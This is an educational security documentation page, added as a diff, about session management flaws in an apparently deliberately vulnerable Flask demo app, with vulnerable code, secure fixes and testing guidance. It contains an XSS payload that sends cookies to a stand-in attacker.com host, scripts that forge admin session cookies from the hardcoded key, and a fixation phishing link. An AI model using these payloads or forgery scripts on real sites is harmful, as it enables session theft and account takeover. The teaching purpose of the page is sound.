@@ -1,0 +1,759 @@
+---
+title: 'Session Management Flaws'
+description: 'Insecure session handling including predictable session IDs and lack of security controls'
+icon: 'clock'
+---
+
+<Warning>
+  **Educational Purpose Only** - Session hijacking can lead to complete account takeover. Only test on authorized systems.
+</Warning>
+
+## Overview
+
+Session management flaws occur when applications fail to properly create, maintain, and destroy user sessions. In this demo, the vulnerable version uses a hardcoded secret key, lacks session security configurations, and doesn't implement proper session lifecycle management, making it vulnerable to session hijacking, fixation, and replay attacks.
+
+<Card title="Severity Rating" icon="exclamation-triangle">
+  **HIGH** - CVSS Score: 7.5/10
+  
+  **CWE Reference**: [CWE-384: Session Fixation](https://cwe.mitre.org/data/definitions/384.html), [CWE-613: Insufficient Session Expiration](https://cwe.mitre.org/data/definitions/613.html)
+</Card>
+
+## Vulnerable Code
+
+The vulnerable implementation has multiple session security issues:
+
+<CodeGroup>
+```python vulnerable/app.py:5-6 (Hardcoded Secret Key)
+app = Flask(__name__)
+app.secret_key = 'clave_super_secreta_123'  # VULNERABLE: Hardcoded
+
+# Problems:
+# 1. Visible in source code (committed to git)
+# 2. Same across all environments
+# 3. Never rotated
+# 4. Easy to guess/discover
+```
+
+```python vulnerable/app.py:33-38 (Weak Session Configuration)
+if user:
+    session['user_id'] = user['id']
+    session['username'] = user['username']
+    session['role'] = user['role']  # Privilege stored in session!
+    flash('Login exitoso!', 'success')
+    return redirect('/dashboard')
+
+# Missing:
+# - session.permanent = True/False
+# - No session regeneration on login
+# - No timeout configuration
+# - No HTTPOnly/Secure flags
+# - No SameSite attribute
+```
+
+```python vulnerable/app.py:112-116 (Incomplete Logout)
+@app.route('/logout')
+def logout():
+    session.clear()  # Only clears session data
+    flash('Sesión cerrada', 'success')
+    return redirect('/')
+
+# Missing:
+# - No session ID regeneration
+# - No server-side session invalidation
+# - No cache control headers
+```
+</CodeGroup>
+
+### Vulnerability Analysis
+
+<AccordionGroup>
+  <Accordion title="1. Hardcoded Secret Key">
+    **Risk**: The secret key (`clave_super_secreta_123`) is hardcoded in the source:
+    
+    ```python
+    app.secret_key = 'clave_super_secreta_123'
+    ```
+    
+    **Impact**:
+    - Anyone with source code access can forge session cookies
+    - Key is visible in version control history
+    - Same key used in dev, staging, and production
+    - Cannot be rotated without code deployment
+    
+    **Exploitation**:
+    ```python
+    from flask.sessions import SecureCookieSessionInterface
+    from flask import Flask
+    
+    app = Flask(__name__)
+    app.secret_key = 'clave_super_secreta_123'  # Known secret
+    
+    # Create malicious session
+    session_data = {'user_id': 1, 'username': 'admin', 'role': 'admin'}
+    serializer = SecureCookieSessionInterface().get_signing_serializer(app)
+    forged_cookie = serializer.dumps(session_data)
+    
+    # Now attacker can use this cookie to impersonate admin
+    ```
+  </Accordion>
+  
+  <Accordion title="2. No Session Security Flags">
+    **Missing Configurations**:
+    
+    ```python
+    # Not configured in vulnerable version:
+    app.config['SESSION_COOKIE_HTTPONLY'] = True  # Missing
+    app.config['SESSION_COOKIE_SECURE'] = True    # Missing
+    app.config['SESSION_COOKIE_SAMESITE'] = 'Lax' # Missing
+    app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=30)  # Missing
+    ```
+    
+    **Risks**:
+    - **No HTTPOnly**: JavaScript can access `document.cookie` (XSS → session theft)
+    - **No Secure**: Cookie sent over HTTP (network sniffing)
+    - **No SameSite**: CSRF attacks possible
+    - **No Timeout**: Sessions never expire
+  </Accordion>
+  
+  <Accordion title="3. Session Privilege Escalation">
+    **Vulnerable Pattern**:
+    ```python
+    session['role'] = user['role']  # Client-side storage of privileges!
+    ```
+    
+    **Attack**: Modify session cookie to change role:
+    ```python
+    # Original session (regular user)
+    {'user_id': 2, 'username': 'usuario', 'role': 'user'}
+    
+    # Modified session (privilege escalation)
+    {'user_id': 2, 'username': 'usuario', 'role': 'admin'}  # Changed!
+    ```
+    
+    With known secret key, attacker can:
+    1. Decode existing session
+    2. Change `role` to `admin`
+    3. Re-sign with known secret key
+    4. Use forged cookie to gain admin access
+  </Accordion>
+  
+  <Accordion title="4. No Session Regeneration">
+    **Vulnerability**: Session ID never changes after login
+    
+    ```python
+    # Vulnerable login - no session regeneration
+    if user:
+        session['user_id'] = user['id']  # Uses same session ID
+    ```
+    
+    **Attack - Session Fixation**:
+    1. Attacker creates session: `session_id=ABC123`
+    2. Attacker tricks victim into using this session (phishing link)
+    3. Victim logs in with `session_id=ABC123`
+    4. Attacker now has authenticated session `session_id=ABC123`
+  </Accordion>
+  
+  <Accordion title="5. Infinite Session Lifetime">
+    **Issue**: Sessions never expire
+    
+    ```python
+    # No timeout configured
+    # Sessions remain valid indefinitely
+    ```
+    
+    **Risks**:
+    - Shared computer: Next user inherits session
+    - Stolen cookie: Works forever
+    - Abandoned devices: Still authenticated
+    - No forced re-authentication
+  </Accordion>
+</AccordionGroup>
+
+## Attack Scenarios
+
+<Steps>
+  <Step title="Session Hijacking via XSS">
+    Combined with the XSS vulnerability:
+    
+    ```javascript
+    // XSS payload to steal session
+    <script>
+        // Steal session cookie
+        var session = document.cookie;
+        
+        // Send to attacker server
+        fetch('https://attacker.com/steal?cookie=' + encodeURIComponent(session));
+    </script>
+    ```
+    
+    **Attack URL**:
+    ```
+    /dashboard?message=<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
+    ```
+    
+    **Result**: Attacker receives victim's session cookie and can impersonate them
+  </Step>
+  
+  <Step title="Session Forgery with Known Secret">
+    With the hardcoded secret key, forge admin sessions:
+    
+    ```python
+    from itsdangerous import URLSafeTimedSerializer
+    
+    # Known secret from source code
+    secret_key = 'clave_super_secreta_123'
+    
+    # Create serializer
+    serializer = URLSafeTimedSerializer(secret_key)
+    
+    # Forge admin session
+    session_data = {
+        'user_id': 1,
+        'username': 'admin',
+        'role': 'admin'
+    }
+    
+    # Generate forged cookie
+    forged_cookie = serializer.dumps(session_data)
+    print(f"session={forged_cookie}")
+    
+    # Use this cookie in browser to become admin
+    ```
+  </Step>
+  
+  <Step title="Session Fixation Attack">
+    1. Attacker visits site, gets session ID: `session=attacker_sid`
+    2. Attacker crafts phishing link:
+       ```
+       https://auth-vulnerable.onrender.com/login?PHPSESSID=attacker_sid
+       ```
+    3. Victim clicks link and logs in
+    4. Since session ID doesn't regenerate, attacker's ID is now authenticated
+    5. Attacker uses `session=attacker_sid` to access victim's account
+  </Step>
+  
+  <Step title="Network Sniffing (No Secure Flag)">
+    If site accessible over HTTP:
+    
+    ```bash
+    # Attacker on same network runs Wireshark
+    tcpdump -i wlan0 -A | grep -i 'cookie'
+    
+    # Captures:
+    # Cookie: session=eyJyb2xlIjoiYWRtaW4iLCJ1c2VyX2lkIjoxfQ...
+    ```
+    
+    Attacker can replay this cookie immediately.
+  </Step>
+</Steps>
+
+## Secure Implementation
+
+The secure version implements comprehensive session security:
+
+<CodeGroup>
+```python secure/app.py:7-16 (Secure Secret Key)
+from dotenv import load_dotenv
+import os
+
+load_dotenv()
+
+app = Flask(__name__)
+# SECURE: Secret key from environment variable
+app.secret_key = os.getenv('SECRET_KEY')
+
+# In .env file (NOT committed to git):
+# SECRET_KEY=randomly_generated_256_bit_key_here
+# Example: secrets.token_hex(32)
+```
+
+```python secure/app.py:63-68 (Session Regeneration)
+# SECURE: Hash verification separate from database
+if user and check_password_hash(user['password'], password):
+    # Regenerate session ID to prevent fixation
+    session.clear()
+    session['user_id'] = user['id']
+    session['username'] = user['username']
+    session['role'] = user['role']
+    session.permanent = True  # Use PERMANENT_SESSION_LIFETIME
+    flash('Login exitoso!', 'success')
+    return redirect('/dashboard')
+```
+
+```python Secure Session Configuration
+# Add to secure/app.py after app creation:
+from datetime import timedelta
+
+# Session security settings
+app.config['SESSION_COOKIE_HTTPONLY'] = True
+app.config['SESSION_COOKIE_SECURE'] = True  # HTTPS only
+app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'  # CSRF protection
+app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=30)
+app.config['SESSION_REFRESH_EACH_REQUEST'] = True
+
+# Additional security
+app.config['MAX_COOKIE_SIZE'] = 4093  # Prevent cookie overflow
+```
+
+```python secure/app.py:181-185 (Secure Logout)
+@app.route('/logout')
+def logout():
+    session.clear()  # Clear all session data
+    flash('Sesión cerrada correctamente', 'success')
+    
+    # Could add server-side session invalidation here
+    # if using Flask-Session or similar
+    
+    return redirect('/')
+```
+
+```python Additional: Middleware for Session Validation
+@app.before_request
+def validate_session():
+    """Validate session on every request"""
+    if 'user_id' in session:
+        # Check if session is expired
+        if 'last_activity' in session:
+            last_activity = session['last_activity']
+            if datetime.now() - last_activity > timedelta(minutes=30):
+                session.clear()
+                flash('Sesión expirada por inactividad', 'warning')
+                return redirect('/login')
+        
+        # Update last activity
+        session['last_activity'] = datetime.now()
+        
+        # Verify user still exists and is active
+        user = get_user_by_id(session['user_id'])
+        if not user or not user.is_active:
+            session.clear()
+            return redirect('/login')
+```
+</CodeGroup>
+
+## Session Security Best Practices
+
+<AccordionGroup>
+  <Accordion title="1. Secure Secret Key Management">
+    **Generate Strong Secrets**:
+    ```python
+    import secrets
+    
+    # Generate cryptographically secure key
+    secret_key = secrets.token_hex(32)  # 256 bits
+    print(secret_key)
+    # Output: '3a7f8c2e1d9b4a6f8e2c1d7b9a4f6e8c2d1b7a9f4e6c8d2b1a7f9e4c6d8b2a1f'
+    ```
+    
+    **Store in Environment**:
+    ```bash
+    # .env file (add to .gitignore)
+    SECRET_KEY=3a7f8c2e1d9b4a6f8e2c1d7b9a4f6e8c2d1b7a9f4e6c8d2b1a7f9e4c6d8b2a1f
+    
+    # Load in application
+    from dotenv import load_dotenv
+    load_dotenv()
+    app.secret_key = os.getenv('SECRET_KEY')
+    ```
+    
+    **Key Rotation**:
+    ```python
+    # Support multiple keys for zero-downtime rotation
+    app.config['SECRET_KEY'] = os.getenv('SECRET_KEY_PRIMARY')
+    app.config['SECRET_KEY_FALLBACK'] = os.getenv('SECRET_KEY_OLD')
+    ```
+  </Accordion>
+  
+  <Accordion title="2. Enable All Cookie Security Flags">
+    ```python
+    from datetime import timedelta
+    
+    # HTTPOnly: Prevents JavaScript access
+    app.config['SESSION_COOKIE_HTTPONLY'] = True
+    
+    # Secure: Only transmitted over HTTPS
+    app.config['SESSION_COOKIE_SECURE'] = True
+    
+    # SameSite: CSRF protection
+    # - 'Strict': Never sent on cross-site requests
+    # - 'Lax': Sent on top-level navigation (default, recommended)
+    # - 'None': Always sent (requires Secure=True)
+    app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
+    
+    # Session timeout
+    app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=1)
+    
+    # Refresh session on each request (extends timeout)
+    app.config['SESSION_REFRESH_EACH_REQUEST'] = True
+    ```
+    
+    **Result Headers**:
+    ```http
+    Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600
+    ```
+  </Accordion>
+  
+  <Accordion title="3. Implement Session Regeneration">
+    Regenerate session ID on privilege changes:
+    
+    ```python
+    def regenerate_session(new_data):
+        """Safely regenerate session ID"""
+        # Save data we want to keep
+        temp_data = {k: v for k, v in session.items()}
+        
+        # Clear old session
+        session.clear()
+        
+        # Update with new data
+        temp_data.update(new_data)
+        session.update(temp_data)
+    
+    @app.route('/login', methods=['POST'])
+    def login():
+        if authenticate(username, password):
+            # Regenerate session on login
+            regenerate_session({
+                'user_id': user.id,
+                'username': user.username,
+                'login_time': datetime.now()
+            })
+    
+    @app.route('/elevate_privileges', methods=['POST'])
+    def elevate_privileges():
+        if verify_admin_password():
+            # Regenerate session on privilege escalation
+            regenerate_session({'is_elevated': True})
+    ```
+  </Accordion>
+  
+  <Accordion title="4. Server-Side Session Storage">
+    Don't store sensitive data in cookies:
+    
+    ```python
+    from flask_session import Session
+    import redis
+    
+    # Configure server-side sessions
+    app.config['SESSION_TYPE'] = 'redis'
+    app.config['SESSION_REDIS'] = redis.from_url('redis://localhost:6379')
+    app.config['SESSION_USE_SIGNER'] = True
+    app.config['SESSION_KEY_PREFIX'] = 'session:'
+    
+    Session(app)
+    
+    # Now session data stored in Redis, not cookie
+    # Cookie only contains session ID
+    ```
+    
+    **Benefits**:
+    - Cookie only contains random session ID
+    - Can invalidate sessions server-side
+    - Can track concurrent sessions
+    - Can implement "logout all devices"
+  </Accordion>
+  
+  <Accordion title="5. Implement Session Monitoring">
+    Track and detect suspicious session activity:
+    
+    ```python
+    @app.before_request
+    def track_session_activity():
+        if 'user_id' in session:
+            current_ip = request.remote_addr
+            current_ua = request.headers.get('User-Agent')
+            
+            # First request in session - record fingerprint
+            if 'session_ip' not in session:
+                session['session_ip'] = current_ip
+                session['session_ua'] = current_ua
+                session['created_at'] = datetime.now()
+            else:
+                # Check for suspicious changes
+                if session['session_ip'] != current_ip:
+                    # IP changed - possible hijacking
+                    logger.warning(f"Session IP changed: {session['session_ip']} -> {current_ip}")
+                    
+                    # Optional: Force re-authentication
+                    session.clear()
+                    flash('Session expired due to security check', 'warning')
+                    return redirect('/login')
+                
+                if session['session_ua'] != current_ua:
+                    # User agent changed - possible hijacking
+                    logger.warning(f"Session UA changed")
+            
+            # Update last activity
+            session['last_activity'] = datetime.now()
+    ```
+  </Accordion>
+  
+  <Accordion title="6. Absolute and Idle Timeouts">
+    Implement both types of session expiration:
+    
+    ```python
+    from datetime import datetime, timedelta
+    
+    @app.before_request
+    def check_session_timeout():
+        if 'user_id' not in session:
+            return
+        
+        now = datetime.now()
+        
+        # Absolute timeout: Session must end after X hours regardless
+        if 'created_at' in session:
+            absolute_timeout = timedelta(hours=8)
+            if now - session['created_at'] > absolute_timeout:
+                session.clear()
+                flash('Sesión expirada. Por favor inicie sesión nuevamente.', 'warning')
+                return redirect('/login')
+        
+        # Idle timeout: Session expires after X minutes of inactivity
+        if 'last_activity' in session:
+            idle_timeout = timedelta(minutes=30)
+            if now - session['last_activity'] > idle_timeout:
+                session.clear()
+                flash('Sesión expirada por inactividad.', 'warning')
+                return redirect('/login')
+        
+        # Update last activity
+        session['last_activity'] = now
+    ```
+  </Accordion>
+</AccordionGroup>
+
+## Advanced Session Security
+
+### Concurrent Session Management
+
+```python
+import redis
+
+redis_client = redis.Redis(host='localhost', port=6379, decode_responses=True)
+
+class SessionManager:
+    MAX_CONCURRENT_SESSIONS = 3
+    
+    @staticmethod
+    def create_session(user_id, session_id):
+        """Track new session"""
+        key = f"user_sessions:{user_id}"
+        
+        # Add session to user's active sessions
+        redis_client.zadd(key, {session_id: time.time()})
+        
+        # Limit concurrent sessions
+        session_count = redis_client.zcard(key)
+        if session_count > SessionManager.MAX_CONCURRENT_SESSIONS:
+            # Remove oldest session
+            oldest = redis_client.zrange(key, 0, 0)
+            if oldest:
+                redis_client.zrem(key, oldest[0])
+                # Invalidate oldest session
+                redis_client.delete(f"session:{oldest[0]}")
+    
+    @staticmethod
+    def logout_all_sessions(user_id):
+        """Logout from all devices"""
+        key = f"user_sessions:{user_id}"
+        session_ids = redis_client.zrange(key, 0, -1)
+        
+        # Delete all sessions
+        for sid in session_ids:
+            redis_client.delete(f"session:{sid}")
+        
+        # Clear session list
+        redis_client.delete(key)
+    
+    @staticmethod
+    def get_active_sessions(user_id):
+        """Get list of user's active sessions"""
+        key = f"user_sessions:{user_id}"
+        session_ids = redis_client.zrange(key, 0, -1, withscores=True)
+        
+        sessions = []
+        for sid, created_at in session_ids:
+            session_data = redis_client.hgetall(f"session:{sid}")
+            sessions.append({
+                'id': sid,
+                'created_at': datetime.fromtimestamp(created_at),
+                'ip': session_data.get('ip'),
+                'user_agent': session_data.get('user_agent')
+            })
+        
+        return sessions
+```
+
+### Session Security Headers
+
+```python
+@app.after_request
+def set_security_headers(response):
+    """Set security headers to protect sessions"""
+    # Prevent caching of sensitive pages
+    if 'user_id' in session:
+        response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, private'
+        response.headers['Pragma'] = 'no-cache'
+        response.headers['Expires'] = '0'
+    
+    # Prevent clickjacking
+    response.headers['X-Frame-Options'] = 'DENY'
+    
+    # XSS protection
+    response.headers['X-Content-Type-Options'] = 'nosniff'
+    response.headers['X-XSS-Protection'] = '1; mode=block'
+    
+    # HTTPS enforcement
+    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
+    
+    return response
+```
+
+## Testing Session Security
+
+<Tabs>
+  <Tab title="Manual Testing">
+    ```bash
+    # 1. Test cookie flags
+    curl -I https://target.com/login
+    # Look for: HttpOnly; Secure; SameSite=Lax
+    
+    # 2. Test session fixation
+    # Get pre-login session
+    curl -c cookies.txt https://target.com/login
+    # Login with this session
+    curl -b cookies.txt -d "user=admin&pass=admin123" https://target.com/login
+    # Check if session ID changed
+    
+    # 3. Test session timeout
+    # Login and get session
+    curl -c cookies.txt -d "user=admin&pass=admin123" https://target.com/login
+    # Wait 31 minutes
+    sleep 1860
+    # Try accessing protected page
+    curl -b cookies.txt https://target.com/dashboard
+    # Should redirect to login
+    
+    # 4. Test concurrent sessions
+    # Login multiple times from different locations
+    # Check if old sessions are invalidated
+    ```
+  </Tab>
+  
+  <Tab title="Burp Suite">
+    1. **Sequencer** - Analyze session token randomness:
+       - Capture 10,000+ session tokens
+       - Burp analyzes entropy and patterns
+       - Should show "excellent" randomness
+    
+    2. **Repeater** - Test session timeout:
+       - Send authenticated request
+       - Wait past timeout period
+       - Replay request
+       - Should receive 401/redirect
+    
+    3. **Intruder** - Test session fixation:
+       - Set pre-login session cookie
+       - Login with fixed session
+       - Check if session ID changes
+  </Tab>
+  
+  <Tab title="Automated Script">
+    ```python
+    import requests
+    import time
+    
+    def test_session_security(base_url):
+        results = {}
+        
+        # Test 1: Check cookie flags
+        r = requests.get(f"{base_url}/login")
+        cookie = r.cookies.get('session')
+        if cookie:
+            # Check flags in Set-Cookie header
+            set_cookie = r.headers.get('Set-Cookie', '')
+            results['httponly'] = 'HttpOnly' in set_cookie
+            results['secure'] = 'Secure' in set_cookie
+            results['samesite'] = 'SameSite' in set_cookie
+        
+        # Test 2: Session fixation
+        session = requests.Session()
+        # Get pre-login session
+        r1 = session.get(f"{base_url}/login")
+        pre_login_sid = session.cookies.get('session')
+        
+        # Login
+        r2 = session.post(f"{base_url}/login",
+                         data={'username': 'test', 'password': 'test'})
+        post_login_sid = session.cookies.get('session')
+        
+        results['session_regeneration'] = (pre_login_sid != post_login_sid)
+        
+        # Test 3: Session timeout
+        session2 = requests.Session()
+        session2.post(f"{base_url}/login",
+                     data={'username': 'test', 'password': 'test'})
+        
+        # Wait 31 minutes (in real test)
+        # time.sleep(1860)
+        
+        r3 = session2.get(f"{base_url}/dashboard")
+        results['timeout_enforced'] = (r3.status_code in [401, 403] or '/login' in r3.url)
+        
+        return results
+    
+    # Run test
+    results = test_session_security('https://auth-vulnerable.onrender.com')
+    print(results)
+    ```
+  </Tab>
+</Tabs>
+
+## Compliance Requirements
+
+<CardGroup cols={2}>
+  <Card title="OWASP ASVS" icon="shield">
+    **Level 2 Requirements**:
+    - 3.2.1: Session tokens have sufficient entropy (128 bits)
+    - 3.3.1: Logout invalidates session server-side
+    - 3.3.2: Absolute session timeout under 12 hours
+    - 3.3.3: Idle timeout under 30 minutes
+  </Card>
+  
+  <Card title="PCI-DSS" icon="credit-card">
+    **Requirement 6.5.10**: Session management
+    - Secure session ID generation
+    - Timeout inactive sessions
+    - Regenerate ID after authentication
+  </Card>
+  
+  <Card title="NIST 800-63B" icon="landmark">
+    **Section 7.1**: Session Management
+    - Minimum 64 bits of entropy
+    - Absolute timeout under 12 hours
+    - Idle timeout under 30 minutes
+    - Reauthentication for sensitive operations
+  </Card>
+  
+  <Card title="GDPR" icon="scale-balanced">
+    **Article 32**: Security of processing
+    - Confidentiality of session data
+    - Ability to ensure ongoing confidentiality
+    - Incident detection and response
+  </Card>
+</CardGroup>
+
+## References
+
+- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
+- [CWE-384: Session Fixation](https://cwe.mitre.org/data/definitions/384.html)
+- [CWE-613: Insufficient Session Expiration](https://cwe.mitre.org/data/definitions/613.html)
+- [Flask Security Considerations](https://flask.palletsprojects.com/en/stable/security/)
+
+<Card title="Next Steps" icon="arrow-right">
+  Related vulnerabilities:
+  - [XSS](/vulnerabilities/xss) - Session theft via cross-site scripting
+  - [CSRF](/vulnerabilities/csrf) - Cross-site request forgery
+  - [Security Misconfiguration](/vulnerabilities/security-misconfiguration) - Additional security headers
+</Card>
